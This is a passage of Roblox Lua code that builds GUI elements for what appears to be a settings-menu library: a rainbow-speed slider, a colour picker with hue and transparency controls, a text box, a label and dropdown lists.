								TextLabel2113132.BackgroundTransparency = 1.000 
								TextLabel2113132.Position = C.UDIM2(0, 32, 0, -2) 
								TextLabel2113132.Size = C.UDIM2(0, 100, 0, 15) 
								TextLabel2113132.Font = Enum.Font.Gotham 
								TextLabel2113132.Text = "Rainbow speed" 
								TextLabel2113132.TextColor3 = C.COL3RGB(200, 200, 200) 
								TextLabel2113132.TextSize = 11.000
								TextLabel2113132.TextXAlignment = Enum.TextXAlignment.Left 
								TextLabel2113132.ZIndex = 3

								Button2113132.Name = "Button2113132" 
								Button2113132.Parent = Slider2113132 
								Button2113132.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Button2113132.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Button2113132.Position = C.UDIM2(0, 30, 0, 15) 
								Button2113132.Size = C.UDIM2(0, 175, 0, 5) 
								Button2113132.AutoButtonColor = false 
								Button2113132.Font = Enum.Font.SourceSans 
								Button2113132.Text = "" 
								Button2113132.TextColor3 = C.COL3RGB(0, 0, 0) 
								Button2113132.TextSize = 11.000
								Button2113132.ZIndex = 3

								Frame123123.Parent = Button2113132 
								Frame123123.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Frame123123.BorderSizePixel = 0 
								Frame123123.Size = C.UDIM2(0.5, 0, 1, 0) 
								Frame123123.ZIndex = 3
								
								UIGradient123123.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, MainUIColor), ColorSequenceKeypoint.new(1.00, C.COL3RGB(75, 92, 112))}
								
								
								UIGradient123123.Rotation = 90
								UIGradient123123.Parent = Frame123123


								Value123123123.Name = "Value123123123" 
								Value123123123.Parent = Slider2113132 
								Value123123123.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Value123123123.BackgroundTransparency = 1.000 
								Value123123123.Position = C.UDIM2(0, 30, 0, 15) 
								Value123123123.Size = C.UDIM2(0, 175, 0, 5)  
								Value123123123.Font = Enum.Font.Gotham 
								Value123123123.Text = "50" 
								Value123123123.TextStrokeTransparency = 0.000
								Value123123123.TextColor3 = C.COL3RGB(200, 200, 200) 
								Value123123123.TextSize = 11.000 
								Value123123123.ZIndex = 4
								local min, max, default = 1, 6, 3
								--Element.Value123123123 = {Slider2113132 = default}
								local a
								if min > 0 then 
									a = ((Element.value.RainbowSpeed - min)) / (max-min) 
								else 
									a = (Element.value.RainbowSpeed-min)/(max-min) 
								end 
								Value123123123.Text = default
								Frame123123.Size = C.UDIM2(a,0,1,0) 
								--values[tabname][sectorname][text] = Element.Value123123123 
								local uis = game:GetService('UserInputService')
								local mouse = game.Players.LocalPlayer:GetMouse() 
								local val 
								Button2113132.MouseButton1Down:Connect(function() 
									Frame123123.Size = C.UDIM2(0, C.CLAMP(mouse.X - Frame123123.AbsolutePosition.X, 0, 175), 0, 5) 
									val = C.FLOOR((((tonumber(max) - tonumber(min)) / 175) * Frame123123.AbsoluteSize.X) + tonumber(min)) or 0 
									Value123123123.Text = val 
									Element.value.RainbowSpeed = val 
									--values[tabname][sectorname][text] = Element.Value123123123 
									--callback(Element.Value123123123) 
									moveconnection = mouse.Move:Connect(function() 
										Frame123123.Size = C.UDIM2(0, C.CLAMP(mouse.X - Frame123123.AbsolutePosition.X, 0, 175), 0, 5) 
										val = C.FLOOR((((tonumber(max) - tonumber(min)) / 175) * Frame123123.AbsoluteSize.X) + tonumber(min)) 
										Value123123123.Text = val 
										--RainbowSpeed = val 
										--values[tabname][sectorname][text] = Element.Value123123123 
										--callback(Element.Value123123123) 
									end) 
									releaseconnection = uis.InputEnded:Connect(function(Mouse) 
										if Mouse.UserInputType == Enum.UserInputType.MouseButton1 then 
											Frame123123.Size = C.UDIM2(0, C.CLAMP(mouse.X - Frame123123.AbsolutePosition.X, 0, 175), 0, 5) 
											val = C.FLOOR((((tonumber(max) - tonumber(min)) / 175) * Frame123123.AbsoluteSize.X) + tonumber(min)) 
											--values[tabname][sectorname][text] = Element.Value123123123 
											--callback(Element.Value123123123) 
											moveconnection:Disconnect() 
											releaseconnection:Disconnect() 
										end 
									end) 
								end) 								
								---------------------------------------------------------------------------------------------------------------------

								Colorpick.Name = "Colorpick" 
								Colorpick.Parent = Frame 
								Colorpick.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Colorpick.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Colorpick.ClipsDescendants = false 
								Colorpick.Position = C.UDIM2(0, 40, 0, 10) 
								Colorpick.Size = C.UDIM2(0, 150, 0, 150) 
								Colorpick.AutoButtonColor = false 
								Colorpick.Image = "rbxassetid://4155801252" 
								Colorpick.ImageColor3 = C.COL3RGB(255, 0, 0) 
								Colorpick.ZIndex = 3 

								ColorDrag.Name = "ColorDrag" 
								ColorDrag.Parent = Colorpick 
								ColorDrag.AnchorPoint = C.Vec2(0.5, 0.5) 
								ColorDrag.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								ColorDrag.BorderColor3 = C.COL3RGB(18, 18, 16) 
								ColorDrag.Size = C.UDIM2(0, 4, 0, 4) 
								ColorDrag.ZIndex = 3 

								Huepick.Name = "Huepick" 
								Huepick.Parent = Frame 
								Huepick.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Huepick.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Huepick.ClipsDescendants = true 
								Huepick.Position = C.UDIM2(0, 10, 0, 10) 
								Huepick.Size = C.UDIM2(0, 20, 0, 150) 
								Huepick.AutoButtonColor = false 
								Huepick.Image = "rbxassetid://3641079629" 
								Huepick.ImageColor3 = C.COL3RGB(255, 0, 0) 
								Huepick.ImageTransparency = 1 
								Huepick.BackgroundTransparency = 0 
								Huepick.ZIndex = 3 

								local HueFrameGradient = C.INST("UIGradient") 
								HueFrameGradient.Rotation = 90 
								HueFrameGradient.Name = "HueFrameGradient" 
								HueFrameGradient.Parent = Huepick 
								HueFrameGradient.Color = ColorSequence.new { 
									ColorSequenceKeypoint.new(0.00, C.COL3RGB(255, 0, 0)), 
									ColorSequenceKeypoint.new(0.17, C.COL3RGB(255, 0, 255)), 
									ColorSequenceKeypoint.new(0.33, C.COL3RGB(0, 0, 255)), 
									ColorSequenceKeypoint.new(0.50, C.COL3RGB(0, 255, 255)), 
									ColorSequenceKeypoint.new(0.67, C.COL3RGB(0, 255, 0)), 
									ColorSequenceKeypoint.new(0.83, C.COL3RGB(255, 255, 0)), 
									ColorSequenceKeypoint.new(1.00, C.COL3RGB(255, 0, 0)) 
								}	 

								Huedrag.Name = "Huedrag" 
								Huedrag.Parent = Huepick 
								Huedrag.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Huedrag.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Huedrag.Size = C.UDIM2(1, 0, 0, 2) 
								Huedrag.ZIndex = 3 

								local Transpick = C.INST("ImageButton") 
								local Transcolor = C.INST("ImageLabel") 
								local Transdrag = C.INST("Frame") 

								Transpick.Name = "Transpick" 
								Transpick.Parent = Frame 
								Transpick.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Transpick.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Transpick.Position = C.UDIM2(0, 10, 0, 167) 
								Transpick.Size = C.UDIM2(0, 180, 0, 15) 
								Transpick.AutoButtonColor = false 
								Transpick.Image = "rbxassetid://3887014957" 
								Transpick.ScaleType = Enum.ScaleType.Tile 
								Transpick.TileSize = C.UDIM2(0, 10, 0, 10) 
								Transpick.ZIndex = 4 

								Transcolor.Name = "Transcolor" 
								Transcolor.Parent = Transpick 
								Transcolor.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Transcolor.BackgroundTransparency = 1.000 
								Transcolor.Size = C.UDIM2(1, 0, 1, 0) 
								Transcolor.Image = "rbxassetid://3887017050" 
								Transcolor.ImageColor3 = C.COL3RGB(255, 0, 4) 
								Transcolor.ZIndex = 4 

								Transdrag.Name = "Transdrag" 
								Transdrag.Parent = Transcolor 
								Transdrag.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Transdrag.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Transdrag.Position = C.UDIM2(0, -1, 0, 0) 
								Transdrag.Size = C.UDIM2(0, 2, 1, 0) 
								Transdrag.ZIndex = 4

								ColorP.MouseButton1Down:Connect(function() 
									Frame.Visible = not Frame.Visible 
								end) 
								local abc = false 
								local inCP = false 
								ColorP.MouseEnter:Connect(function() 
									abc = true 
								end) 
								ColorP.MouseLeave:Connect(function() 
									abc = false 
								end) 
								Frame.MouseEnter:Connect(function() 
									inCP = true 
								end) 
								Frame.MouseLeave:Connect(function() 
									inCP = false 
								end) 

								ColorH = (C.CLAMP(Huedrag.AbsolutePosition.Y-Huepick.AbsolutePosition.Y, 0, Huepick.AbsoluteSize.Y)/Huepick.AbsoluteSize.Y) 
								ColorS = 1-(C.CLAMP(ColorDrag.AbsolutePosition.X-Colorpick.AbsolutePosition.X, 0, Colorpick.AbsoluteSize.X)/Colorpick.AbsoluteSize.X) 
								ColorV = 1-(C.CLAMP(ColorDrag.AbsolutePosition.Y-Colorpick.AbsolutePosition.Y, 0, Colorpick.AbsoluteSize.Y)/Colorpick.AbsoluteSize.Y) 

								if data.default and data.default.Color ~= nil then 
									ColorH, ColorS, ColorV = data.default.Color:ToHSV() 

									ColorH = C.CLAMP(ColorH,0,1) 
									ColorS = C.CLAMP(ColorS,0,1) 
									ColorV = C.CLAMP(ColorV,0,1) 
									ColorDrag.Position = C.UDIM2(1-ColorS,0,1-ColorV,0) 
									Colorpick.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 

									Transcolor.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 

									ColorP.BackgroundColor3 = C.COL3HSV(ColorH, ColorS, ColorV) 
									Huedrag.Position = C.UDIM2(0, 0, 1-ColorH, -1) 
								elseif Element.value.Color ~= nil then
									ColorH, ColorS, ColorV = Element.value.Color:ToHSV() 

									ColorH = C.CLAMP(ColorH,0,1) 
									ColorS = C.CLAMP(ColorS,0,1) 
									ColorV = C.CLAMP(ColorV,0,1) 
									ColorDrag.Position = C.UDIM2(1-ColorS,0,1-ColorV,0) 
									Colorpick.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 

									Transcolor.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 

									ColorP.BackgroundColor3 = C.COL3HSV(ColorH, ColorS, ColorV) 
									Huedrag.Position = C.UDIM2(0, 0, 1-ColorH, -1) 
								end 
								if data.default and data.default.Transparency ~= nil then 
									Transdrag.Position = C.UDIM2(data.default.Transparency, -1, 0, 0) 
								end 
								local mouse = LocalPlayer:GetMouse() 
								game:GetService("UserInputService").InputBegan:Connect(function(input) 
									if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.MouseButton2 then 
										if not dragging and not abc and not inCP then 
											Frame.Visible = false 
										end 
									end 
								end) 

								local function updateColor() 
									local ColorX = (C.CLAMP(mouse.X - Colorpick.AbsolutePosition.X, 0, Colorpick.AbsoluteSize.X)/Colorpick.AbsoluteSize.X) 
									local ColorY = (C.CLAMP(mouse.Y - Colorpick.AbsolutePosition.Y, 0, Colorpick.AbsoluteSize.Y)/Colorpick.AbsoluteSize.Y) 
									ColorDrag.Position = C.UDIM2(ColorX, 0, ColorY, 0) 
									ColorS = 1-ColorX 
									ColorV = 1-ColorY 
									Colorpick.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 
									ColorP.BackgroundColor3 = C.COL3HSV(ColorH, ColorS, ColorV) 
									Transcolor.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 
									values[tabname][sectorname][text] = Element.value 
									Element.value.Color = C.COL3HSV(ColorH, ColorS, ColorV) 
									callback(Element.value) 
								end 
								local function updateHue() 
									local y = C.CLAMP(mouse.Y - Huepick.AbsolutePosition.Y, 0, 148) 
									Huedrag.Position = C.UDIM2(0, 0, 0, y) 
									hue = y/148 
									ColorH = 1-hue 
									Colorpick.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 
									Transcolor.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 
									ColorP.BackgroundColor3 = C.COL3HSV(ColorH, ColorS, ColorV) 
									values[tabname][sectorname][text] = Element.value 
									Element.value.Color = C.COL3HSV(ColorH, ColorS, ColorV) 
									callback(Element.value) 
								end 
								local function updateTrans() 
									local x = C.CLAMP(mouse.X - Transpick.AbsolutePosition.X, 0, 178) 
									Transdrag.Position = C.UDIM2(0, x, 0, 0) 
									Element.value.Transparency = (x/178) 
									values[tabname][sectorname][text] = Element.value 
									callback(Element.value) 
								end 
								Transpick.MouseButton1Down:Connect(function() 
									updateTrans() 
									moveconnection = mouse.Move:Connect(function() 
										updateTrans() 
									end) 
									releaseconnection = game:GetService("UserInputService").InputEnded:Connect(function(Mouse) 
										if Mouse.UserInputType == Enum.UserInputType.MouseButton1 then 
											updateTrans() 
											moveconnection:Disconnect() 
											releaseconnection:Disconnect() 
										end 
									end) 
								end) 
								Colorpick.MouseButton1Down:Connect(function() 
									updateColor() 
									moveconnection = mouse.Move:Connect(function() 
										updateColor() 
									end) 
									releaseconnection = game:GetService("UserInputService").InputEnded:Connect(function(Mouse) 
										if Mouse.UserInputType == Enum.UserInputType.MouseButton1 then 
											updateColor() 
											moveconnection:Disconnect() 
											releaseconnection:Disconnect() 
										end 
									end) 
								end) 
								Huepick.MouseButton1Down:Connect(function() 
									updateHue() 
									moveconnection = mouse.Move:Connect(function() 
										updateHue() 
									end) 
									releaseconnection = game:GetService("UserInputService").InputEnded:Connect(function(Mouse) 
										if Mouse.UserInputType == Enum.UserInputType.MouseButton1 then 
											updateHue() 
											moveconnection:Disconnect() 
											releaseconnection:Disconnect() 
										end 
									end) 
								end) 

								Button.MouseButton1Down:Connect(function() 
									Element.value.Toggle = not Element.value.Toggle 
									update() 
									values[tabname][sectorname][text] = Element.value 
									callback(Element.value) 
								end) 
								if data.default then 
									if Element.value.Toggle then 
										tween = library:Tween(Color, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = MainUIColor}) 
										library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 
									else 
										tween = library:Tween(Color, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = C.COL3RGB(46, 46, 46)}) 
										library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
									end 
									values[tabname][sectorname][text] = Element.value 
								end 
								values[tabname][sectorname][text] = Element.value 
								function Element:SetValue(value) 
									Element.value = value 
									local duplicate = C.COL3(value.Color.R, value.Color.G, value.Color.B) 
									ColorH, ColorS, ColorV = duplicate:ToHSV() 
									ColorH = C.CLAMP(ColorH,0,1) 
									ColorS = C.CLAMP(ColorS,0,1) 
									ColorV = C.CLAMP(ColorV,0,1) 

									ColorDrag.Position = C.UDIM2(1-ColorS,0,1-ColorV,0) 
									Colorpick.ImageColor3 = C.COL3HSV(ColorH, 1, 1) 
									ColorP.BackgroundColor3 = C.COL3HSV(ColorH, ColorS, ColorV) 
									update() 
									update123()
									Huedrag.Position = C.UDIM2(0, 0, 1-ColorH, -1) 
								end 
								
								elseif type == "TextBox" then 
									Section.Size = Section.Size + C.UDIM2(0,0,0,30) 
									Element.value = {Text = data.default and data.default.text or "",NoLimit = data.default and data.default.NoLimit or false} 
									NoLimit = data.NoLimit or false
									local Box = C.INST("Frame") 
									local TextBox = C.INST("TextBox") 

									Box.Name = "Box" 
									Box.Parent = Inner 
									Box.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Box.BackgroundTransparency = 1.000 
									Box.Position = C.UDIM2(0, 0, 0.542059898, 0) 
									Box.Size = C.UDIM2(1, 0, 0, 30) 

									TextBox.Parent = Box 
									TextBox.BackgroundColor3 = C.COL3RGB(45, 45, 45) 
									TextBox.BorderColor3 = C.COL3RGB(18, 18, 16)   
									TextBox.Position = C.UDIM2(0.108303241, 0, 0.224465579, 0) 
									TextBox.Size = C.UDIM2(0, 175, 0, 20) 
									TextBox.Font = Enum.Font.Ubuntu
									TextBox.PlaceholderText = data.placeholder 
									TextBox.Text = Element.value.Text 
									TextBox.TextTruncate = 1
									TextBox.ClearTextOnFocus = false
									TextBox.TextStrokeTransparency = 0.000
									TextBox.TextColor3 = C.COL3RGB(255, 255, 255) 
									TextBox.TextSize = 10.000

									values[tabname][sectorname][text] = Element.value 

									TextBox:GetPropertyChangedSignal("Text"):Connect(function() 
										if C.LEN(TextBox.Text) > 20 and (NoLimit == false) then 
											TextBox.Text = C.SUB(TextBox.Text, 1, 20) 
										end 
										Element.value.Text = TextBox.Text 
										values[tabname][sectorname][text] = Element.value 
										callback(Element.value) 
									end) 

									function Element:SetValue(value) 
										Element.value = value 
										values[tabname][sectorname][text] = Element.value 
										TextBox.Text = Element.value.Text 
									end 



							elseif type == "Label" then 
								Section.Size = Section.Size + C.UDIM2(0,0,0,17) 
								Element.value = {Text = data.default and data.options.text or '', stringchange} 

								local Toggle = C.INST("Frame") 
								local TextLabel = C.INST("TextLabel") 

								Toggle.Name = "Toggle" 
								Toggle.Parent = Inner 
								Toggle.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Toggle.BackgroundTransparency = 1.000 
								Toggle.Size = C.UDIM2(1, 0, 0, 15) 

								TextLabel.Parent = Toggle 
								TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								TextLabel.BackgroundTransparency = 1.000 
								TextLabel.Position = C.UDIM2(0, 32, 0, -1) 
								TextLabel.Size = C.UDIM2(0.111913361, 208, 1, 0) 
								TextLabel.Font = Enum.Font.Gotham 
								TextLabel.Text = text 
								TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
								TextLabel.TextSize = 12.000
								TextLabel.TextXAlignment = Enum.TextXAlignment.Left 
								Element.value.stringchange = function(text)
								TextLabel.Text = text
								end
								
								values[tabname][sectorname][text] = Element.value

							elseif type == "Dropdown" then 
								Section.Size = Section.Size + C.UDIM2(0,0,0,39) 
								Element.value = {Dropdown = data.options[1]} 

								local Dropdown = C.INST("Frame") 
								local Button = C.INST("TextButton") 
								local TextLabel = C.INST("TextLabel") 
								local Drop = C.INST("ScrollingFrame") 
								local Button_2 = C.INST("TextButton") 
								local TextLabel_2 = C.INST("TextLabel") 
								local UIListLayout = C.INST("UIListLayout") 
								local ImageLabel = C.INST("ImageLabel") 
								local TextLabel_3 = C.INST("TextLabel") 

								Dropdown.Name = "Dropdown" 
								Dropdown.Parent = Inner 
								Dropdown.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Dropdown.BackgroundTransparency = 1.000 
								Dropdown.Position = C.UDIM2(0, 0, 0.255102038, 0) 
								Dropdown.Size = C.UDIM2(1, 0, 0, 39) 

								Button.Name = "Button" 
								Button.Parent = Dropdown 
								Button.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Button.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Button.Position = C.UDIM2(0, 30, 0, 16) 
								Button.Size = C.UDIM2(0, 175, 0, 17) 
								Button.AutoButtonColor = false 
								Button.Font = Enum.Font.SourceSans 
								Button.Text = "" 
								Button.TextColor3 = C.COL3RGB(0, 0, 0) 
								Button.TextSize = 11.000

								TextLabel.Parent = Button 
								TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								TextLabel.BackgroundTransparency = 1.000 
								TextLabel.BorderColor3 = C.COL3RGB(27, 42, 53) 
								TextLabel.Position = C.UDIM2(0, 5, 0, 0) 
								TextLabel.Size = C.UDIM2(-0.21714285, 208, 1, 0) 
								TextLabel.Font = Enum.Font.Gotham 
								TextLabel.Text = Element.value.Dropdown 
								TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
								TextLabel.TextSize = 11.000
								TextLabel.TextXAlignment = Enum.TextXAlignment.Left 

								local abcd = TextLabel 

								Drop.Name = "Drop" 
								Drop.Parent = Button 
								Drop.Active = true 
								Drop.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Drop.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Drop.Position = C.UDIM2(0, 0, 1, 1) 
								Drop.Size = C.UDIM2(1, 0, 0, 20) 
								Drop.Visible = false 
								Drop.BottomImage = "http://www.roblox.com/asset/?id=6724808282" 
								Drop.CanvasSize = C.UDIM2(0, 0, 0, 0) 
								Drop.ScrollBarThickness = 4 
								Drop.TopImage = "http://www.roblox.com/asset/?id=6724808282" 
								Drop.MidImage = "http://www.roblox.com/asset/?id=6724808282" 
								Drop.AutomaticCanvasSize = "Y" 
								Drop.ZIndex = 5 
								Drop.ScrollBarImageColor3 = MainUIColor 

								UIListLayout.Parent = Drop 
								UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center 
								UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder 

								local num = #data.options 
								if num > 5 then 
									Drop.Size = C.UDIM2(1, 0, 0, 85) 
								else 
									Drop.Size = C.UDIM2(1, 0, 0, 17*num) 
								end 
								local first = true 
								for i,v in ipairs(data.options) do 
									do 
										local Button = C.INST("TextButton") 
										local TextLabel = C.INST("TextLabel") 

										Button.Name = v 
										Button.Parent = Drop 
										Button.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
										Button.BorderColor3 = C.COL3RGB(18, 18, 16) 
										Button.Position = C.UDIM2(0, 30, 0, 16) 
										Button.Size = C.UDIM2(0, 175, 0, 17) 
										Button.AutoButtonColor = false 
										Button.Font = Enum.Font.SourceSans 
										Button.Text = "" 
										Button.TextColor3 = C.COL3RGB(0, 0, 0) 
										Button.TextSize = 11.000
										Button.BorderSizePixel = 0 
										Button.ZIndex = 6 

										TextLabel.Parent = Button 
										TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
										TextLabel.BackgroundTransparency = 1.000 
										TextLabel.BorderColor3 = C.COL3RGB(27, 42, 53) 
										TextLabel.Position = C.UDIM2(0, 5, 0, -1) 
										TextLabel.Size = C.UDIM2(-0.21714285, 208, 1, 0) 
										TextLabel.Font = Enum.Font.Gotham 
										TextLabel.Text = v 
										TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
										TextLabel.TextSize = 11.000
										TextLabel.TextXAlignment = Enum.TextXAlignment.Left 
										TextLabel.ZIndex = 6 

										Button.MouseButton1Down:Connect(function() 
											Drop.Visible = false 
											Element.value.Dropdown = v 
											abcd.Text = v 
											values[tabname][sectorname][text] = Element.value 
											callback(Element.value) 
											Drop.CanvasPosition = C.Vec2(0,0) 
										end) 
										Button.MouseEnter:Connect(function() 
											library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 =  MainUIColor}) 
										end) 
										Button.MouseLeave:Connect(function() 
											library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 =  C.COL3RGB(200, 200, 200)}) 
										end) 

										first = false 
									end 
								end 

								function Element:SetValue(val) 
									Element.value = val 
									abcd.Text = val.Dropdown 
									values[tabname][sectorname][text] = Element.value 
									callback(val) 
								end 

								ImageLabel.Parent = Button 
								ImageLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								ImageLabel.BackgroundTransparency = 1.000 
								ImageLabel.Position = C.UDIM2(0, 165, 0, 6) 
								ImageLabel.Size = C.UDIM2(0, 6, 0, 4) 
								ImageLabel.Image = "http://www.roblox.com/asset/?id=6724771531" 

								TextLabel_3.Parent = Dropdown 
								TextLabel_3.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								TextLabel_3.BackgroundTransparency = 1.000 
								TextLabel_3.Position = C.UDIM2(0, 32, 0, -1) 
								TextLabel_3.Size = C.UDIM2(0.111913361, 208, 0.382215232, 0) 
								TextLabel_3.Font = Enum.Font.Gotham 
								TextLabel_3.Text = text 
								TextLabel_3.TextColor3 = C.COL3RGB(200, 200, 200) 
								TextLabel_3.TextSize = 11.000
								TextLabel_3.TextXAlignment = Enum.TextXAlignment.Left 

								Button.MouseButton1Down:Connect(function() 
									Drop.Visible = not Drop.Visible 
									if not Drop.Visible then 
										Drop.CanvasPosition = C.Vec2(0,0) 
									end 
								end) 
								local indrop = false 
								local ind = false 
								Drop.MouseEnter:Connect(function() 
									indrop = true 
								end) 
								Drop.MouseLeave:Connect(function() 
									indrop = false 
								end) 
								Button.MouseEnter:Connect(function() 
									ind = true 
								end) 
								Button.MouseLeave:Connect(function() 
									ind = false 
								end) 
								game:GetService("UserInputService").InputBegan:Connect(function(input) 
									if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.MouseButton2 then 
										if Drop.Visible == true and not indrop and not ind then 
											Drop.Visible = false 
											Drop.CanvasPosition = C.Vec2(0,0) 
										end 
									end 
								end) 
								values[tabname][sectorname][text] = Element.value 
								
								elseif type == "lmao" then 
								Section.Size = Section.Size + C.UDIM2(0,0,0,39) 
								Element.value = {Dropdown = data.options[1]} 

								local Dropdown = C.INST("Frame") 
								local Button = C.INST("TextButton") 
								local TextLabel = C.INST("TextLabel") 
								local Drop = C.INST("ScrollingFrame") 
								local Button_2 = C.INST("TextButton") 
								local TextLabel_2 = C.INST("TextLabel") 
								local UIListLayout = C.INST("UIListLayout") 
								local ImageLabel = C.INST("ImageLabel") 
								local TextLabel_3 = C.INST("TextLabel") 

								Dropdown.Name = "Dropdown" 
								Dropdown.Parent = Inner 
								Dropdown.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Dropdown.BackgroundTransparency = 1.000 
								Dropdown.Position = C.UDIM2(0, 0, 0.255102038, 0) 
								Dropdown.Size = C.UDIM2(1, 0, 0, 39) 

								Button.Name = "Button" 
								Button.Parent = Dropdown 
								Button.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Button.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Button.Position = C.UDIM2(0, 30, 0, 16) 
								Button.Size = C.UDIM2(0, 175, 0, 17) 
								Button.AutoButtonColor = false 
								Button.Font = Enum.Font.SourceSans 
								Button.Text = "" 
								Button.TextColor3 = C.COL3RGB(0, 0, 0) 
								Button.TextSize = 11.000

								TextLabel.Parent = Button 
								TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								TextLabel.BackgroundTransparency = 1.000 
								TextLabel.BorderColor3 = C.COL3RGB(27, 42, 53) 
								TextLabel.Position = C.UDIM2(0, 5, 0, 0) 
								TextLabel.Size = C.UDIM2(-0.21714285, 208, 1, 0) 
								TextLabel.Font = Enum.Font.Gotham 
								TextLabel.Text = Element.value.Dropdown 
								TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
								TextLabel.TextSize = 11.000
								TextLabel.TextXAlignment = Enum.TextXAlignment.Left 

								local abcd = TextLabel 

								Drop.Name = "Drop" 
								Drop.Parent = Button 
								Drop.Active = true 
								Drop.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Drop.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Drop.Position = C.UDIM2(0, 0, 1, 1) 
								Drop.Size = C.UDIM2(1, 0, 0, 20) 
								Drop.Visible = false 
								Drop.BottomImage = "http://www.roblox.com/asset/?id=6724808282" 
								Drop.CanvasSize = C.UDIM2(0, 0, 0, 0) 
								Drop.ScrollBarThickness = 4 
								Drop.TopImage = "http://www.roblox.com/asset/?id=6724808282" 
								Drop.MidImage = "http://www.roblox.com/asset/?id=6724808282" 
								Drop.AutomaticCanvasSize = "Y" 
								Drop.ZIndex = 5 
								Drop.ScrollBarImageColor3 = MainUIColor 

								UIListLayout.Parent = Drop 
								UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center 
								UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder 

								local num = #data.options 
								if num > 5 then 
									Drop.Size = C.UDIM2(1, 0, 0, 85) 
								else 
									Drop.Size = C.UDIM2(1, 0, 0, 17*num) 
								end 
								local first = true 
							function gay()
								for i,v in ipairs(data.options) do 
									do 
										local Button = C.INST("TextButton") 
										local TextLabel = C.INST("TextLabel") 

										Button.Name = v 
										Button.Parent = Drop 
										Button.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
										Button.BorderColor3 = C.COL3RGB(18, 18, 16) 
										Button.Position = C.UDIM2(0, 30, 0, 16) 
										Button.Size = C.UDIM2(0, 175, 0, 17) 
										Button.AutoButtonColor = false 
										Button.Font = Enum.Font.SourceSans 
										Button.Text = "" 
										Button.TextColor3 = C.COL3RGB(0, 0, 0) 
										Button.TextSize = 11.000
										Button.BorderSizePixel = 0 
										Button.ZIndex = 6 

										TextLabel.Parent = Button 
										TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
										TextLabel.BackgroundTransparency = 1.000 
										TextLabel.BorderColor3 = C.COL3RGB(27, 42, 53) 
										TextLabel.Position = C.UDIM2(0, 5, 0, -1) 
										TextLabel.Size = C.UDIM2(-0.21714285, 208, 1, 0) 
										TextLabel.Font = Enum.Font.Gotham 
										TextLabel.Text = v 
										TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
										TextLabel.TextSize = 11.000
										TextLabel.TextXAlignment = Enum.TextXAlignment.Left 
										TextLabel.ZIndex = 6 

										Button.MouseButton1Down:Connect(function() 
											Drop.Visible = false 
											Element.value.Dropdown = v 
											abcd.Text = v 
											values[tabname][sectorname][text] = Element.value 
											callback(Element.value) 
											Drop.CanvasPosition = C.Vec2(0,0) 
										end) 
										Button.MouseEnter:Connect(function() 
											library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 =  MainUIColor}) 
										end) 
